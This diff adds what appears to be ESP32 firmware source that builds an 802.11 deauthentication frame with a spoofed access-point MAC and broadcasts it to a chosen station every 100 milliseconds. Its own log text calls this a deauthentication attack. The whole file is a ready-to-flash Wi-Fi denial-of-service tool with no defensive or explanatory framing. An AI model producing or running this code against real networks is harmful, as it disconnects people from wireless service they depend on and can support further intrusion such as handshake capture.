@@ -1,0 +1,54 @@
+#include "esp_wifi.h"
+#include "esp_wifi_types.h"
+#include "esp_system.h"
+#include "esp_event.h"
+#include "nvs_flash.h"
+
+// Target AP and Station MAC addresses
+uint8_t target_ap_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Replace with AP MAC
+uint8_t target_station_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Replace with Station MAC
+
+// Deauthentication frame template
+uint8_t deauth_frame[] = {
+    0xC0, 0x00, 0x00, 0x00, // Type/Subtype: Deauthentication (0xC0)
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination MAC (Broadcast)
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Source MAC (AP MAC)
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // BSSID (AP MAC)
+    0x00, 0x00, // Sequence Control
+    0x07, 0x00  // Reason Code: Class 3 frame received from non-associated station
+};
+
+void setup() {
+    Serial.begin(115200);
+
+    // Initialize NVS
+    esp_err_t ret = nvs_flash_init();
+    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
+        ESP_ERROR_CHECK(nvs_flash_erase());
+        ret = nvs_flash_init();
+    }
+    ESP_ERROR_CHECK(ret);
+
+    // Initialize Wi-Fi in promiscuous mode
+    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
+    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
+    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
+    ESP_ERROR_CHECK(esp_wifi_start());
+
+    // Set MAC addresses in the deauthentication frame
+    memcpy(&deauth_frame[4], target_station_mac, 6); // Destination MAC
+    memcpy(&deauth_frame[10], target_ap_mac, 6); // Source MAC
+    memcpy(&deauth_frame[16], target_ap_mac, 6); // BSSID
+
+    Serial.println("Starting deauthentication attack...");
+}
+
+void loop() {
+    // Send deauthentication frame
+    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
+    Serial.println("Deauthentication frame sent!");
+
+    // Delay between frames
+    delay(100);
+}
